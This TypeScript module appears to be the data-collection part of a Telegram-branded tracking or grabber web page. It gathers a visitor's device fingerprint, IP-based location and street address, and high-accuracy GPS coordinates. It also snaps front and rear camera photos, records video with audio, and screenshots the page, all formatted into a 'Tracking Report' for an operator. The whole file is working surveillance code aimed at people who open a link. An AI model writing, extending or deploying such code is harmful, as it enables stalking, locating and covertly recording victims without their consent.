
import type { LocationDetails } from '../types';

interface VideoCaptureResult {
    blob: Blob;
    filename: string;
}

const getLocationDetails = async (lat: number, lon: number): Promise<LocationDetails> => {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await response.json();
        if (data.address) {
            return {
                county: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                suburb: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                fullAddress: data.display_name || "Alamat tidak tersedia"
            };
        }
    } catch (e) {
        console.error("Failed to get location details:", e);
    }
    return {
        county: "Tidak diketahui",
        suburb: "Tidak diketahui",
        fullAddress: "Alamat tidak tersedia"
    };
};

export const getDeviceInformation = async (): Promise<string> => {
    let report = '<b>╭───── Tracking Report ───── ⦿</b>\n\n';
    report += '⚙️ <b>DEVICE INFORMATION</b> | BUKAN GPS TRACKING\n';
    report += `<code>🖥️ Device: ${navigator.userAgent}</code>\n`;
    report += `<code>💻 Platform: ${navigator.platform}</code>\n`;
    report += `<code>🌐 Bahasa: ${navigator.language}</code>\n`;
    report += `<code>📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}</code>\n`;
    report += `<code>📺 Screen: ${window.screen.width}x${window.screen.height}</code>\n`;
    report += `<code>🪟 Window: ${window.innerWidth}x${window.innerHeight}</code>\n`;
    report += `<code>💾 RAM: ${(navigator as any).deviceMemory || 'Unknown'} GB</code>\n`;
    report += `<code>🧠 CPU Cores: ${navigator.hardwareConcurrency}</code>\n`;

    if ((navigator as any).getBattery) {
        try {
            const battery = await (navigator as any).getBattery();
            report += `<code>🔋 Battery: ${Math.floor(battery.level * 100)}%</code>\n`;
            report += `<code>🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}</code>\n`;
        } catch (e) {
            report += '<code>🔋 Battery: ❌ Tidak tersedia</code>\n';
        }
    }

    report += `<code>⏰ Waktu: ${new Date().toString()}</code>\n`;
    report += `<code>📜 History: ${window.history.length}</code>\n`;
    report += `<code>✋ Touch: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}</code>\n`;
    report += `<code>🔗 Referrer: ${document.referrer || 'None'}</code>\n`;
    report += `<code>🌍 URL: ${window.location.href}</code>\n\n`;

    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        report += '📍 <b>LOCATION INFORMATION (BASED ON IP)</b>\n';
        report += `<code>📡 IP: ${ipData.ip}</code>\n`;
        report += `<code>🏙️ Kota: ${ipData.city}</code>\n`;
        report += `<code>🗺️ Wilayah: ${ipData.region}</code>\n`;
        report += `<code>🌎 Negara: ${ipData.country_name}</code>\n`;
        report += `<code>🏷️ Kode Pos: ${ipData.postal}</code>\n`;
        if (ipData.latitude && ipData.longitude) {
            report += `<code>📌 Coords: ${ipData.latitude}, ${ipData.longitude}</code>\n`;
            const details = await getLocationDetails(ipData.latitude, ipData.longitude);
            report += `<code>🏠 Alamat: ${details.fullAddress}</code>\n`;
        }
    } catch (e) {
        report += '❌ Gagal mendapatkan informasi lokasi berbasis IP\n';
    }
    report += '\n<b>╰───── Telegram @ryzzreal ───── ⦿</b>';
    return report;
};

export const getGpsLocation = (): Promise<string> => {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            return reject(new Error("Geolocation tidak didukung oleh browser ini."));
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                const details = await getLocationDetails(latitude, longitude);
                let report = '📍 <b>GPS TRACKING (HIGH ACCURACY)</b>\n';
                report += `<code>📌 Lat: ${latitude}</code>\n`;
                report += `<code>📍 Lng: ${longitude}</code>\n`;
                report += `<code>🎯 Akurasi: ${accuracy}m</code>\n`;
                report += `<code>🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}</code>\n`;
                report += `<code>🏙️ Kabupaten: ${details.county}</code>\n`;
                report += `<code>🏙️ Kecamatan: ${details.suburb}</code>\n`;
                report += `<code>🏠 Alamat: ${details.fullAddress}</code>\n`;
                resolve(report);
            },
            (error) => {
                reject(new Error(`GPS Error: ${error.message}`));
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
};

export const capturePhoto = (mode: 'user' | 'environment', videoEl: HTMLVideoElement, canvasEl: HTMLCanvasElement): Promise<Blob | null> => {
    return new Promise(async (resolve, reject) => {
        let stream: MediaStream | null = null;
        const timeoutId = setTimeout(() => {
            stream?.getTracks().forEach(track => track.stop());
            reject(new Error(`Camera capture timed out for mode: ${mode}`));
        }, 10000); // 10-second timeout

        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: mode } // More flexible facingMode
            });
            videoEl.srcObject = stream;

            // Use oncanplay which is more reliable for knowing when the video has data
            videoEl.oncanplay = async () => {
                try {
                    await videoEl.play();
                    // Wait for the camera to auto-adjust exposure, focus, etc.
                    await new Promise(r => setTimeout(r, 1000));
                    
                    canvasEl.width = videoEl.videoWidth;
                    canvasEl.height = videoEl.videoHeight;
                    const context = canvasEl.getContext('2d');
                    if (context) {
                        context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
                    }

                    canvasEl.toBlob(blob => {
                        clearTimeout(timeoutId);
                        stream?.getTracks().forEach(track => track.stop());
                        videoEl.srcObject = null; // Clean up the video element
                        resolve(blob);
                    }, 'image/jpeg', 0.9); // Use a quality setting
                } catch (playError) {
                    clearTimeout(timeoutId);
                    stream?.getTracks().forEach(track => track.stop());
                    videoEl.srcObject = null;
                    reject(playError);
                }
            };
            
            videoEl.onerror = (e) => {
                clearTimeout(timeoutId);
                stream?.getTracks().forEach(track => track.stop());
                videoEl.srcObject = null;
                reject(new Error(`Video element error: ${JSON.stringify(e)}`));
            };

        } catch (error) {
            clearTimeout(timeoutId);
            stream?.getTracks().forEach(track => track.stop());
            reject(error);
        }
    });
};

export const recordVideo = (durationMs: number): Promise<VideoCaptureResult> => {
    return new Promise(async (resolve, reject) => {
        if (!window.MediaRecorder) {
            return reject(new Error('MediaRecorder API not supported in this browser.'));
        }

        let stream: MediaStream | null = null;
        const timeoutId = setTimeout(() => {
            stream?.getTracks().forEach(track => track.stop());
            reject(new Error('Video recording timed out.'));
        }, durationMs + 5000); // Timeout is duration + 5s buffer

        try {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true,
                });
            } catch (userFacingError) {
                console.warn('Front camera w/ audio failed, trying any camera.', userFacingError);
                // Fallback to any camera if the front one fails
                stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true,
                });
            }
           
            const supportedMimeTypes = [
                'video/webm;codecs=vp9',
                'video/webm;codecs=vp8',
                'video/webm',
                'video/mp4',
            ];
            const supportedType = supportedMimeTypes.find(type => MediaRecorder.isTypeSupported(type));

            if (!supportedType) {
                clearTimeout(timeoutId);
                stream?.getTracks().forEach(track => track.stop());
                return reject(new Error('No supported video mimeType found for MediaRecorder.'));
            }
            
            const options = { mimeType: supportedType };
            const mediaRecorder = new MediaRecorder(stream, options);
            const chunks: Blob[] = [];

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                   chunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                clearTimeout(timeoutId);
                const videoBlob = new Blob(chunks, { type: options.mimeType });
                const extension = options.mimeType.includes('mp4') ? 'mp4' : 'webm';
                const filename = `video_capture.${extension}`;
                stream?.getTracks().forEach(track => track.stop());
                
                if (videoBlob.size === 0) {
                     reject(new Error('Video recording resulted in an empty file.'));
                } else {
                     resolve({ blob: videoBlob, filename });
                }
            };
            
            mediaRecorder.onerror = (event) => {
                 clearTimeout(timeoutId);
                 stream?.getTracks().forEach(track => track.stop());
                 reject((event as ErrorEvent).error || new Error('MediaRecorder encountered an unknown error.'));
            };

            mediaRecorder.start();

            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, durationMs);

        } catch (error) {
            clearTimeout(timeoutId);
            stream?.getTracks().forEach(track => track.stop());
            reject(error);
        }
    });
};

export const takeScreenshot = (): Promise<Blob | null> => {
    return new Promise(async (resolve, reject) => {
        try {
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            const canvas = await (window as any).html2canvas(document.body);
            canvas.toBlob((blob: Blob | null) => {
                if (blob) {
                    resolve(blob);
                } else {
                    reject(new Error("Screenshot blob creation failed."));
                }
            }, 'image/jpeg');
        } catch (error) {
            reject(error);
        }
    });
};
